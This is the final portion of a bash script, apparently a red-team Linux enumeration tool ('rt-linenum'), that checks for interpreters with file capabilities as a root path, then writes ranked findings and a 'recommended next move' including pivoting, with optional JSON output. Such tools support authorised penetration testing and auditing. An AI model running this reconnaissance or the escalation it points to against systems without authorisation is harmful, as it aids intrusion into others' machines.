  has getcap && TG getcap -r /usr 2>/dev/null | grep -E 'perl|python|ruby|php|node' && flag HIGH "Scripting interpreter carries capabilities (see above) -> likely root."
fi

# ----------------------------- summary -----------------------------
sect "Writing ranked summary"
{
  echo "rt-linenum summary - $HOST - $(date)"
  echo "Identity: $(id -un 2>/dev/null)  uid=$(id -u 2>/dev/null)"
  echo
  echo "### HIGH ($HIGHN) ###"; printf '%s\n' "${J_HIGH[@]:-}"
  echo; echo "### MED ($MEDN) ###";  printf '%s\n' "${J_MED[@]:-}"
  echo; echo "### INFO ($INFON) ###"; printf '%s\n' "${J_INFO[@]:-}"
  echo; echo "=== RECOMMENDED NEXT MOVE ==="
  if [ -s "$NEXT" ]; then head -2 "$NEXT" | sed 's/^\[\*\] /-> /'; else echo "-> No scripted finding. Review HIGH list, then pivot (containers/network/AD)."; fi
} > "$SUMMARY"

if [ "$JSON" = "1" ]; then
  jarr(){ printf '['; first=1; shift; for e in "$@"; do [ $first -eq 1 ]||printf ','; first=0; printf '%s' "$e" | sed 's/\\/\\\\/g;s/"/\\"/g' | awk '{printf "\"%s\"",$0}'; done; printf ']'; }
  {
    printf '{\n'
    printf '  "host":"%s","identity":"%s","ts":"%s",\n' "$HOST" "$(id -un 2>/dev/null)" "$TS"
    printf '  "high":'; jarr x "${J_HIGH[@]:-}"; printf ',\n'
    printf '  "med":';  jarr x "${J_MED[@]:-}";  printf ',\n'
    printf '  "info":'; jarr x "${J_INFO[@]:-}"; printf ',\n'
    printf '  "next_steps":'; jarr x "${J_NEXT[@]:-}"; printf '\n'
    printf '}\n'
  } > "$JFILE"
fi

echo
echo "${G}[+] Done. HIGH=$HIGHN MED=$MEDN INFO=$INFON${N}"
echo "${G}[+] Read: $SUMMARY  and  $NEXT${N}"
